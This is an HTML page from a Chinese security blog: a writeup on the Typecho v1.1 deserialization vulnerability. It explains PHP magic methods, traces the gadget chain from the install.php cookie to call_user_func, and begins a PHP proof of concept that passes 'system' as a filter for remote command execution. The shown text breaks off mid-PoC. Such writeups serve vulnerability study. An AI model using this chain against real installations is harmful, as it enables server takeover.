@@ -1,0 +1,1257 @@
+<!DOCTYPE html>
+<html><head>
+<title>Typecho反序列化漏洞</title>
+
+
+
+
+<meta charset="utf-8">
+<meta name="X-UA-Compatible" content="IE=edge">
+<meta name="google-site-verification" content="">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+<meta content="telephone=no" name="format-detection">
+<meta name="description" content="Chaitin-Writeup-反序列化">
+<meta name="renderer" content="webkit">
+<meta name="theme-color" content="#ffffff">
+
+
+
+
+
+
+
+
+
+
+
+<script src="/vendor/js/jquery.min.js" ></script>
+<script src="/vendor/js/popper.min.js" ></script>
+<script src="/vendor/js/bootstrap.min.js" ></script>
+<script src="/vendor/js/smooth-scroll.polyfills.min.js" ></script>
+<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">
+<script src="/vendor/js/vue.min.js" ></script>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://b40du.github.io/scss/journal.min.47aa1ffb60880ad8c72feecd6962a14331eca7a7a30e08354a1ca91009b8bc5b.css" integrity="sha256-R6of&#43;2CICtjHL&#43;7NaWKhQzHsp6ejDgg1ShypEAm4vFs=" media="screen">
+
+
+
+<link rel="stylesheet" href="https://b40du.github.io/scss/dark-mode.min.b13808e7c98cd5aa981a3822fd3421e26f1015876bb15a3fbf8ed5991c382367.css" integrity="sha256-sTgI58mM1aqYGjgi/TQh4m8QFYdrsVo/v47VmRw4I2c=" media="screen">
+
+
+<script src="https://b40du.github.io/js/loadCSS.js"></script>
+<script>
+  loadCSS("https://fonts.googleapis.com/css?family=Lora|Montserrat|Fira+Mono|Noto+Serif+SC|Material+Icons");
+</script>
+
+
+
+
+  
+    <script src="https://b40du.github.io/js/toc-collapse.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+</head><body>
+    	<div id="app"><div ref="sideContainer" class="side-container">
+    
+    <a class="a-block nav-head false" href="https://b40du.github.io">
+    
+        <div class="nav-title">
+            爆肚的杂货铺
+        </div>
+        
+        <div class="nav-subtitle">
+            b40du&#39;s blog
+        </div>
+        
+    </a>
+
+    <div class="nav-link-list">
+        
+        
+            
+            
+            
+                
+            
+            
+            
+            <a class="a-block nav-link-item active" href="/posts">
+                归档
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/categories">
+                分类
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/tags">
+                标签
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/about">
+                关于
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/index.xml">
+                RSS订阅
+            </a>
+            
+        
+    </div>
+
+    
+
+    <div class="nav-footer">
+        
+Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://amazingrise.net">Rise</a>
+<br>
+Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	This is a customized copyright.
+	
+
+    </div>
+    
+</div><div ref="extraContainer" class="extra-container">
+    
+    
+    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- CATALOG -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#1-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86" onclick="collapseOthers(`#1-前置知识-nav`)" id="1-前置知识-nav">
+									1. 前置知识
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								<ul class="collapse" data-toggle="collapse">
+							
+						
+						
+							<li>
+								<a href="#11-%e4%bb%80%e4%b9%88%e6%98%af%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" onclick="collapseOthers(`#11-什么是反序列化-nav`)" id="11-什么是反序列化-nav">
+									1.1 什么是反序列化？
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#12-%e4%b8%ba%e4%bd%95%e9%80%a0%e6%88%90%e6%bc%8f%e6%b4%9e%e4%ba%a7%e7%94%9f" onclick="collapseOthers(`#12-为何造成漏洞产生-nav`)" id="12-为何造成漏洞产生-nav">
+									1.2 为何造成漏洞产生？
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#13-%e4%b8%be%e4%b8%aa%e5%b0%8f%e4%be%8b%e5%ad%90" onclick="collapseOthers(`#13-举个小例子-nav`)" id="13-举个小例子-nav">
+									1.3 举个小例子
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#2-%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0" onclick="collapseOthers(`#2-漏洞成因-nav`)" id="2-漏洞成因-nav">
+									2. 漏洞成因
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#3-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" onclick="collapseOthers(`#3-漏洞分析-nav`)" id="3-漏洞分析-nav">
+									3. 漏洞分析
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								<ul class="collapse" data-toggle="collapse">
+							
+						
+						
+							<li>
+								<a href="#31-installphp-%e6%96%87%e4%bb%b6" onclick="collapseOthers(`#31-installphp-文件-nav`)" id="31-installphp-文件-nav">
+									3.1 install.php 文件
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#32-dbphp-%e6%96%87%e4%bb%b6" onclick="collapseOthers(`#32-dbphp-文件-nav`)" id="32-dbphp-文件-nav">
+									3.2 Db.php 文件
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#33-feedphp-%e6%96%87%e4%bb%b6" onclick="collapseOthers(`#33-feedphp-文件-nav`)" id="33-feedphp-文件-nav">
+									3.3 Feed.php 文件
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#34-requestphp-%e6%96%87%e4%bb%b6" onclick="collapseOthers(`#34-requestphp-文件-nav`)" id="34-requestphp-文件-nav">
+									3.4 Request.php 文件
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#4-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" onclick="collapseOthers(`#4-漏洞利用-nav`)" id="4-漏洞利用-nav">
+									4. 漏洞利用
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								<ul class="collapse" data-toggle="collapse">
+							
+						
+						
+							<li>
+								<a href="#41-%e6%a2%b3%e7%90%86%e5%88%a9%e7%94%a8%e6%b5%81%e7%a8%8b" onclick="collapseOthers(`#41-梳理利用流程-nav`)" id="41-梳理利用流程-nav">
+									4.1 梳理利用流程
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#42-%e6%9e%84%e9%80%a0poc" onclick="collapseOthers(`#42-构造poc-nav`)" id="42-构造poc-nav">
+									4.2 构造POC
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#43-%e6%b3%a8%e6%84%8f%e4%ba%8b%e9%a1%b9" onclick="collapseOthers(`#43-注意事项-nav`)" id="43-注意事项-nav">
+									4.3 注意事项
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+    
+    <div class="pagination">
+        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
+            <i class="material-icons pagination-action-icon">
+                keyboard_arrow_up
+            </i>
+        </a>
+        
+        <a class="pagination-action" v-on:click="toggleDarkMode">
+            <i class="material-icons pagination-action-icon" v-if="isDarkMode">
+                brightness_4
+            </i>
+            <i class="material-icons pagination-action-icon" v-else="isDarkMode">
+                brightness_7
+            </i>
+        </a>
+        
+        
+    </div>
+</div><div class="single-column-drawer-container" ref="drawer"
+     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
+    <div class="drawer-content">
+        <div class="drawer-menu">
+            
+            
+            
+                
+                
+                
+                    
+                
+                
+                
+                <a class="a-block drawer-menu-item active" href="/posts">
+                    归档
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/categories">
+                    分类
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/tags">
+                    标签
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/about">
+                    关于
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/index.xml">
+                    RSS订阅
+                </a>
+                
+            
+            
+            <div class="toc">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- CATALOG -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#1-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86" onclick="collapseOthers(`#1-前置知识-nav`)" id="1-前置知识-nav">
+									1. 前置知识
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								<ul class="collapse" data-toggle="collapse">
+							
+						
+						
+							<li>
+								<a href="#11-%e4%bb%80%e4%b9%88%e6%98%af%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" onclick="collapseOthers(`#11-什么是反序列化-nav`)" id="11-什么是反序列化-nav">
+									1.1 什么是反序列化？
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#12-%e4%b8%ba%e4%bd%95%e9%80%a0%e6%88%90%e6%bc%8f%e6%b4%9e%e4%ba%a7%e7%94%9f" onclick="collapseOthers(`#12-为何造成漏洞产生-nav`)" id="12-为何造成漏洞产生-nav">
+									1.2 为何造成漏洞产生？
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#13-%e4%b8%be%e4%b8%aa%e5%b0%8f%e4%be%8b%e5%ad%90" onclick="collapseOthers(`#13-举个小例子-nav`)" id="13-举个小例子-nav">
+									1.3 举个小例子
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#2-%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0" onclick="collapseOthers(`#2-漏洞成因-nav`)" id="2-漏洞成因-nav">
+									2. 漏洞成因
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#3-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" onclick="collapseOthers(`#3-漏洞分析-nav`)" id="3-漏洞分析-nav">
+									3. 漏洞分析
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								<ul class="collapse" data-toggle="collapse">
+							
+						
+						
+							<li>
+								<a href="#31-installphp-%e6%96%87%e4%bb%b6" onclick="collapseOthers(`#31-installphp-文件-nav`)" id="31-installphp-文件-nav">
+									3.1 install.php 文件
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#32-dbphp-%e6%96%87%e4%bb%b6" onclick="collapseOthers(`#32-dbphp-文件-nav`)" id="32-dbphp-文件-nav">
+									3.2 Db.php 文件
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#33-feedphp-%e6%96%87%e4%bb%b6" onclick="collapseOthers(`#33-feedphp-文件-nav`)" id="33-feedphp-文件-nav">
+									3.3 Feed.php 文件
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#34-requestphp-%e6%96%87%e4%bb%b6" onclick="collapseOthers(`#34-requestphp-文件-nav`)" id="34-requestphp-文件-nav">
+									3.4 Request.php 文件
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#4-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" onclick="collapseOthers(`#4-漏洞利用-nav`)" id="4-漏洞利用-nav">
+									4. 漏洞利用
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								<ul class="collapse" data-toggle="collapse">
+							
+						
+						
+							<li>
+								<a href="#41-%e6%a2%b3%e7%90%86%e5%88%a9%e7%94%a8%e6%b5%81%e7%a8%8b" onclick="collapseOthers(`#41-梳理利用流程-nav`)" id="41-梳理利用流程-nav">
+									4.1 梳理利用流程
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#42-%e6%9e%84%e9%80%a0poc" onclick="collapseOthers(`#42-构造poc-nav`)" id="42-构造poc-nav">
+									4.2 构造POC
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#43-%e6%b3%a8%e6%84%8f%e4%ba%8b%e9%a1%b9" onclick="collapseOthers(`#43-注意事项-nav`)" id="43-注意事项-nav">
+									4.3 注意事项
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+            
+        </div>
+    </div>
+</div>
+<transition name="fade">
+    <div v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
+</transition>
+<nav ref="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
+    <div ref="navBackground" class="nav-background"></div>
+    <div class="container container-narrow nav-content">
+        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
+            <i class="material-icons">
+                menu
+            </i>
+        </button>
+        <a ref="navTitle" class="navbar-brand" href="https://b40du.github.io">
+            爆肚的杂货铺
+        </a>
+        
+        <button type="button" class="nav-darkmode-toggle" v-on:click="toggleDarkMode">
+            <i class="material-icons" v-if="isDarkMode">
+                brightness_4
+            </i>
+            <i class="material-icons" v-else="isDarkMode">
+                brightness_7
+            </i>
+        </button>
+        
+    </div>
+</nav>
+<div class="single-column-header-container" ref="pageHead"
+     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
+    <a href="https://b40du.github.io">
+        <div class="single-column-header-title">爆肚的杂货铺</div>
+        
+        <div class="single-column-header-subtitle">b40du&#39;s blog</div>
+        
+
+    </a>
+</div>
+            <div id="content">
+<div ref="streamContainer" class="stream-container">
+    <div class="post-list-container post-list-container-shadow">
+        <div class="post">
+            
+            
+            
+
+            <div class="post-head-wrapper-text-only"
+                
+            >
+                <div class="post-title">
+                    Typecho反序列化漏洞
+                    
+                    <div class="post-subtitle">
+                        Chaitin-Writeup-反序列化
+                    </div>
+                    
+                    <div class="post-meta">
+                        
+
+                        
+                            <i class="material-icons" style="">folder</i>
+                                <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-writeup">反序列化, writeup</a>
+                                &nbsp;
+                        
+
+                        
+                            <i class="material-icons" style="">label</i>
+                            
+                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a>
+                                &nbsp;
+                            
+                                <a href="/tags/writeup">writeup</a>
+                                &nbsp;
+                            
+                                <a href="/tags/wp">wp</a>
+                                &nbsp;
+                            
+                        
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="post-body-wrapper">
+                
+                <div class="post-body" v-pre>
+                
+                    <h1 id="1-前置知识">1. 前置知识</h1>
+<h2 id="11-什么是反序列化">1.1 什么是反序列化？</h2>
+<p>序列化：将对象变成可以传输的字符串（Json格式便是一种序列化）</p>
+<p>反序列化：将可以传输的字符串再变成对象</p>
+<h2 id="12-为何造成漏洞产生">1.2 为何造成漏洞产生？</h2>
+<p>漏洞产生的原因主要是因为PHP语言自带的魔术方法，魔术方法一般是由<code>__</code>开头，在某些条件下可以自动调用，而不需要我们手工调用。</p>
+<p>如果是学习过C++的同学应该理解，如果我们创建一个空的类，它本身会默认产生如下几个类成员函数：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>
+{
+	<span style="color:#960050;background-color:#1e0010">缺省构造函数</span>
+	<span style="color:#960050;background-color:#1e0010">缺省拷贝构造函数</span>
+	<span style="color:#960050;background-color:#1e0010">缺省析构函数</span>
+	<span style="color:#960050;background-color:#1e0010">缺省赋值运算符</span>
+	<span style="color:#960050;background-color:#1e0010">缺省取址运算符</span>
+	<span style="color:#960050;background-color:#1e0010">缺省取址运算符</span> <span style="color:#66d9ef">const</span><span style="color:#960050;background-color:#1e0010">。</span> 
+}
+</code></pre></div><p>那么在类创建对象的时候，构造函数会首先执行，在我们销毁对象的时候，析构函数会最后执行，而构造函数和析构函数执行的时候，并不需要我们手动操作。</p>
+<p>那么PHP语言自带的魔术方法，也是类似的情况，在创建/销毁对象以及其他若干操作的时候，会自动调用某些魔术方法。</p>
+<p><strong>一般情况下如下魔术方法是我们特别需要警惕的：</strong></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>调用条件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>__wakeup()</code></td>
+<td>使用<code>unserialize()</code>时调用</td>
+</tr>
+<tr>
+<td><code>__sleep()</code></td>
+<td>使用<code>serialize()</code>时调用</td>
+</tr>
+<tr>
+<td><code>__construct()</code></td>
+<td>当对象创建时会自动调用（单在<code>unserialize()</code>时是不会自动调用的）</td>
+</tr>
+<tr>
+<td><code>__destruct()</code></td>
+<td>当对象被销毁时会自动调用</td>
+</tr>
+<tr>
+<td><code>__call()</code></td>
+<td>在对象上下文中调用不可访问的方法时调用</td>
+</tr>
+<tr>
+<td><code>__callStatic()</code></td>
+<td>在静态上下文中调用不可访问的方法时调用</td>
+</tr>
+<tr>
+<td><code>__get()</code></td>
+<td>用于从不可访问的属性读取数据，在对象上下文中调用不可访问的方法时触发</td>
+</tr>
+<tr>
+<td><code>__set()</code></td>
+<td>用于将数据写入不可访问的属性</td>
+</tr>
+<tr>
+<td><code>__isset()</code></td>
+<td>在不可访问的属性上调用<code>isset()</code>或<code>empty()</code>触发</td>
+</tr>
+<tr>
+<td><code>__unset()</code></td>
+<td>在不可访问的属性上使用<code>unset()</code>时触发</td>
+</tr>
+<tr>
+<td><code>__toString()</code></td>
+<td>当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</td>
+</tr>
+<tr>
+<td><code>__invoke()</code></td>
+<td>当脚本尝试将对象调用为函数时触发</td>
+</tr>
+</tbody>
+</table>
+<p>如果服务器能够接收我们反序列化过的字符串，并且未经过滤，直接把字符串中的变量交给魔术方法自动执行，就很有可能产生意想不到的问题以及漏洞。</p>
+<h2 id="13-举个小例子">1.3 举个小例子</h2>
+<p>我们构造一个简单的小案例：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span> {
+    <span style="color:#66d9ef">var</span> $test <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;demo&#34;</span>;
+    <span style="color:#66d9ef">function</span> __destruct(){
+    	<span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span>;
+    }
+}
+$a <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;test&#39;</span>];
+$a_unser <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($a);
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><p><strong>这个时候如果我们构造了如下<code>poc</code>：</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>{
+    <span style="color:#66d9ef">public</span> $test;
+    <span style="color:#66d9ef">public</span> $hello;
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($test, $hello){
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> $test;
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hello</span> <span style="color:#f92672">=</span> $hello;
+    }
+}
+$demo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">A</span>(<span style="color:#e6db74">&#39;test&#39;</span>, <span style="color:#e6db74">&#39;hello&#39;</span>);
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($demo)
+</code></pre></div><p><strong>产生了这样一串<code>payload</code>：</strong></p>
+<pre><code>O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;hello&quot;;}
+</code></pre><p>我们在<code>url</code>栏中输入</p>
+<pre><code>http://ip地址/test.php?test=O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;hello&quot;;}
+</code></pre><p>就能控制原代码<code>echo</code>出来的变量，同时，我们也可以修改为恶意代码。</p>
+<h1 id="2-漏洞成因">2. 漏洞成因</h1>
+<p>该漏洞发生在<code>install.php</code>文件中，在函数<code>unserialize()</code>的参数<code> __typecho_config</code>中我们可以构造的恶意代码，让程序进行一系列的操作，最后由<code>call_user_func()</code>函数或者是<code>array_map()</code>函数实现任意代码执行。</p>
+<h1 id="3-漏洞分析">3. 漏洞分析</h1>
+<p>一上来拿到站点是比较懵逼的，除了首页所有的页面都不能点，搜索直接报错。</p>
+<p>那我们直接上扫描器，看看这个站点的敏感目录，发现<code>install.php</code>暴露在外，但是无法读取。</p>
+<p><img src="C:%5CNutstore%5C999-%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87%5Cimage-20200710214625249.png" alt="image-20200710214625249"></p>
+<p>我们还是下载源码，对源码进行审计，看看反序列化漏洞的点在哪里。</p>
+<blockquote>
+<p>Typecho源码下载地址：https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta</p>
+<p>该漏洞生效版本为：v1.1-15.5.12-beta以及之前的版本</p>
+</blockquote>
+<p>下载以后我们打开查看文件，并重点筛选那些魔术方法，找到如下文件：</p>
+<h2 id="31-installphp-文件">3.1 install.php 文件</h2>
+<p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710220216.png" alt=""></p>
+<p>如上图所示，我们发现，<code>$config</code>变量是由<code>unserialize</code>函数生成的，传入的参数是<code>__typecho_config</code>，这个参数是可以被我们控制的<code>cookie</code>值。</p>
+<p>然后程序会创建一个<code>Typecho_Db</code>的实例化对象，参数就是刚刚生成的<code>$config</code>变量。</p>
+<h2 id="32-dbphp-文件">3.2 Db.php 文件</h2>
+<p>然后我们追踪到<code>Typecho_Db</code>类，在<code>Db.php</code>文件中。</p>
+<p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710220700.png" alt=""></p>
+<p>构造函数会将传入的实参<code>$config['adapter']</code>，也就是形参<code>$adapterName</code>进行字符串拼接，如果<code>$adapterName</code>是一个类的实例化对象，在对其进行字符串拼接的过程中，会触发魔术方法<code>__toSring()</code></p>
+<h2 id="33-feedphp-文件">3.3 Feed.php 文件</h2>
+<p>在<code>Feed.php</code>文件中，有<code>__toString()</code>魔术方法，而在这个方法内，我们可以搜索到<code>screenName</code>。</p>
+<p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710220950.png" alt=""></p>
+<p>这里代码的作用是访问<code>$item['author']</code>中的<code>screenName</code>对象。</p>
+<p>而<code>$item</code>呢，是使用<code>foreach</code>对<code>$this-&gt;_items</code>数组进行遍历而产生的。</p>
+<p>而<code>$this-&gt;_items</code>是<code>Typecho_Feed</code>类中的一个属性，可以被我们所控制。</p>
+<h2 id="34-requestphp-文件">3.4 Request.php 文件</h2>
+<p>之前我们说过，程序会访问<code>$item['author']</code>中的<code>screenName</code>对象。而如果我们从外部想获取一个类中的私有属性，或者调用一个在类中不存在的对象时，会触发类中的<code>__get</code>魔术方法。</p>
+<p>如下图所示，调用了自己的<code>get</code>方法</p>
+<p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710222033.png" alt=""></p>
+<p>那么它自己的<code>get</code>方法是做什么的呢？</p>
+<p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710222647.png" alt=""></p>
+<p>我们传入key值，也就是<code>screenName</code>，然后去找<code>$this-&gt;_params</code>中的元素，形成<code>$value</code>变量。</p>
+<p>而<code>$this-&gt;_params</code>是<code>Typecho_Request</code>类中的一个属性，可以被我们所控制。</p>
+<p>然后<code>$value</code>变量会进入<code>_applyFilter</code>方法。</p>
+<p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710222918.png" alt=""></p>
+<p>在这里我们看到，<code>$value</code>会进入两个函数分别是<code>array_map</code>和<code>call_user_func</code>，<code>$value</code>变量可以被我们控制。</p>
+<p>其次，<code>$filter</code>变量是<code>$this-&gt;_filter</code>中的元素，<code>$this-&gt;_filter</code>是当前<code>Typecho_Request</code>类中的属性，也可以被我们控制。</p>
+<p>因此<code>array_map()</code>和<code>call_user_func()</code>的两个参数都可控，我们可以在前面的参数内传入<code>system</code>，在后面的参数内传入指令，便可以<code>getshell</code>。</p>
+<h1 id="4-漏洞利用">4. 漏洞利用</h1>
+<h2 id="41-梳理利用流程">4.1 梳理利用流程</h2>
+<p>接下来我们梳理一下利用流程：</p>
+<ol>
+<li>在<code>install.php</code>中，传入我们构造的<code>cookie</code>值触发反序列化，实例化对象的时候，传入<code>Typecho_Db</code>类。</li>
+<li>然后在<code>Typecho_Db</code>类中进行字符串拼接，触发<code>__toString()</code>魔术方法。</li>
+<li>然后在含有<code>__toString()</code>魔术方法的在<code>Typecho_Feed</code>类中，获取私有属性，触发<code>__get()</code>魔术方法。</li>
+<li>然后在含有<code>__get()</code>魔术方法的<code>Typecho_Request</code>类中，调用<code>_applyFilter()</code>方法。</li>
+<li>然后在<code>_applyFilter()</code>方法中，触发<code>array_map()</code>和<code>call_user_func()</code>这两个参数可控的危险函数。</li>
+</ol>
+<h2 id="42-构造poc">4.2 构造POC</h2>
+<p>然后便可以构造如下<code>poc</code>：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Typecho_Request</span>{
+	<span style="color:#66d9ef">private</span> $_params <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+	<span style="color:#66d9ef">private</span> $_filter <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+
+	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
+		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_params</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;screenName&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;exp&#34;</span>);
+		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_filter</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;system&#34;</span>);
+	}
+}
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Typecho_Feed</span>{
+	<span style="color:#66d9ef">private</span> $_items <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+	<span style="color:#66d9ef">private</span> $_type;
+
+	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
+		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_items</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+			<span style="color:#66d9ef">array</span>(
+				<span style="color:#e6db74">&#34;author&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Typecho_Request</span>(),
+				<span style="color:#e6db74">&#34;link&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;link&#34;</span>,
+				<span style="color:#e6db74">&#34;title&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;title&#34;</span>,
+				<span style="color:#e6db74">&#34;date&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;date&#34;</span>,
